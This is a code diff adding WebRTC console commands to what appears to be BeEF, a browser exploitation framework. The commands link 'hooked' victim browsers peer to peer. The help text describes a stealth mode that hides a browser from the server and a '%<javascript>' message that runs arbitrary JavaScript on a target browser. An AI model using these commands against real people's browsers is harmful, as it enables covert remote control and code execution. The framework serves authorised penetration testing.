@@ -29,6 +29,9 @@ class Core
       "review"  => "Target a particular previously hooked (offline) hooked browser",
       "show"    => "Displays 'zombies' or 'browsers' or 'commands'. (For those who prefer the MSF way)",
       "target"  => "Target a particular online hooked browser",
+      "rtcgo"   => "Initiate the WebRTC connectivity between two browsers",
+      "rtcmsg"  => "Send a message from a browser to its peers",
+      "rtcstatus" => "Check a browsers WebRTC status"
     }
   end
   
@@ -243,6 +246,121 @@ class Core
   def cmd_target_help(*args)
     print_status("Target a particular online, hooked browser")
     print_status("  Usage: target <id>")
+  end
+
+  def cmd_rtcgo(*args)
+    if BeEF::Core::Configuration.instance.get("beef.extension.webrtc.enable") != true
+      print_status("WebRTC Extension is not enabled..")
+      return false
+    end
+
+    @@bare_opts.parse(args) {|opt,idx,val|
+      case opt
+      when "-h"
+        cmd_rtcgo_help
+        return false
+      end
+    }
+
+    if args[0] == nil or args[1] == nil
+      cmd_rtcgo_help
+      return
+    end
+
+    onlinezombies = []
+    BeEF::Core::Models::HookedBrowser.all(:lastseen.gt => (Time.new.to_i - 30)).each do |z|
+      onlinezombies << z.id
+    end
+
+    if not onlinezombies.include?(args[0].to_i)
+      print_status("Browser [id:"+args[0].to_s+"] does not appear to be online.")
+      return false
+    end
+
+    if not onlinezombies.include?(args[1].to_i)
+      print_status("Browser [id:"+args[1].to_s+"] does not appear to be online.")
+      return false
+    end
+
+    if args[2] == nil
+      BeEF::Core::Models::Rtcmanage.initiate(args[0].to_i,args[1].to_i)
+    else
+      if args[2] =~ (/^(true|t|yes|y|1)$/i)
+        BeEF::Core::Models::Rtcmanage.initiate(args[0].to_i,args[1].to_i,true)
+      else
+        BeEF::Core::Models::Rtcmanage.initiate(args[0].to_i,args[1].to_i)
+      end
+    end
+
+  end
+
+  def cmd_rtcgo_help(*args)
+    print_status("To kick off the WebRTC Peer to Peer between two browsers")
+    print_status("  Usage: rtcgo <caller id> <receiver id> <verbosity - defaults to false>")
+  end
+
+  def cmd_rtcmsg(*args)
+    if BeEF::Core::Configuration.instance.get("beef.extension.webrtc.enable") != true
+      print_status("WebRTC Extension is not enabled..")
+      return false
+    end
+
+    @@bare_opts.parse(args) {|opt,idx,val|
+      case opt
+      when "-h"
+        cmd_rtcmsg_help
+        return false
+      end
+    }
+
+    if (args[0] == nil || args[1] == nil || args[2] == nil)
+      cmd_rtcmsg_help
+      return
+    else
+      p = ""
+      (2..args.length-1).each do |x|
+        p << args[x] << " "
+      end
+      p.chop!
+      BeEF::Core::Models::Rtcmanage.sendmsg(args[0].to_i,args[1].to_i,p)
+    end
+  end
+
+  def cmd_rtcmsg_help(*args)
+    print_status("Sends a message from this browser to its peers")
+    print_status("  Usage: rtcmsg <from> <to> <msg>")
+    print_status("There are a few <msg> formats that are available within the beefwebrtc client-side object:")
+    print_status(" !gostealth - will put the <to> browser into a stealth mode")
+    print_status(" !endstealth - will put the <to> browser into normal mode, and it will start talking to BeEF again")
+    print_status(" %<javascript> - will execute JavaScript on <to> sending the results back to <from> - who will relay back to BeEF")
+    print_status(" <text> - will simply send a datachannel message from <from> to <to>. If the <to> is stealthed, it'll bounce the message back. If the <to> is NOT stealthed, it'll send the message back to BeEF via the /rtcmessage handler")
+  end
+
+  def cmd_rtcstatus(*args)
+    if BeEF::Core::Configuration.instance.get("beef.extension.webrtc.enable") != true
+      print_status("WebRTC Extension is not enabled..")
+      return false
+    end
+
+    @@bare_opts.parse(args) {|opt,idx,val|
+      case opt
+      when "-h"
+        cmd_rtcstatus_help
+        return false
+      end
+    }
+
+    if (args[0] == nil)
+      cmd_rtcstatus_help
+      return
+    else
+      BeEF::Core::Models::Rtcmanage.status(args[0].to_i)
+    end
+  end
+
+  def cmd_rtcstatus_help(*args)
+    print_status("Sends a message to this browser - checking the WebRTC Status of all its peers")
+    print_status("  Usage: rtcstatus <id>")
   end
 
   def cmd_irb(*args)
